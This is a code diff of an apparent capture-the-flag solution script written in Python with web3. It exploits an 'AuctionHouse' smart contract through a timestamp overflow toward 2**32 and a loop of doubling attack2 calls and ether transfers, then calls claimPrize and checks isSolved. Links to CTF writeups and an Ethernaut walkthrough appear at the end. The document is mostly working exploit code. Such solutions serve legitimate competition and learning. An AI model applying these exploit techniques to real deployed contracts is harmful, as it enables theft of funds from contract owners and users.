@@ -27,6 +27,9 @@ timeout0 = w3.eth.get_block(block_number)
 print(block_number)
 print(timeout0)
 
+timegap = 2**32 - timeout0
+index = timegap//YEAR + 1
+
 account_address = Address
 balance = w3.eth.get_balance(account_address)
 print(balance)
@@ -34,22 +37,26 @@ print(balance)
 install_solc("0.7.0")
 
 compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
-abi = compiled['Contract.sol:Contract']['abi']
+abi_contract = compiled['Contract.sol:Contract']['abi']
 
-contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
-contract_instance2.functions.attack2().transact()
-print(contract_instance2.functions.balanceOf(Address).call())
-print(contract_instance2.functions.balanceOf(TargetContract).call())
-print(contract_instance2.functions.balanceOf(SetupContract).call())
+compiled = compile_files(["AuctionHouse.sol"], output_values=["abi"], solc_version="0.7.0")
+abi = compiled['AuctionHouse.sol:AuctionHouse']['abi']
+contract_instance = w3.eth.contract(address=TargetContract, abi=abi)
 
-print("Stage 1 Dnoe!")
+addr = Address
+target = TargetContract
 
-compiled = compile_files(["Shop.sol"], output_values=["abi"], solc_version="0.7.0")
-abi = compiled['Shop.sol:Shop']['abi']
+contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi_contract)
 
-contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
-construct_txn = contract_instance2.functions.buyItem(2).transact()
+value = 0.5
+for i in range(index//2 + 1):
+	value = 2*value + 1	
+	contract_instance2.functions.attack2(value).transact()
 
+	value = 2*value + 1	
+	w3.eth.send_transaction({"from":addr, "to":target,"value":value,})
+
+contract_instance.functions.claimPrize().transact()
 
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
 abi = compiled['Setup.sol:Setup']['abi']
@@ -58,8 +65,8 @@ contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
 number = contract_instance.functions.isSolved(account_address).call()
 
 print(f'The current number stored is: { number } ')
-
 #
+
 '''
 https://ctftime.org/writeup/31583
 https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8
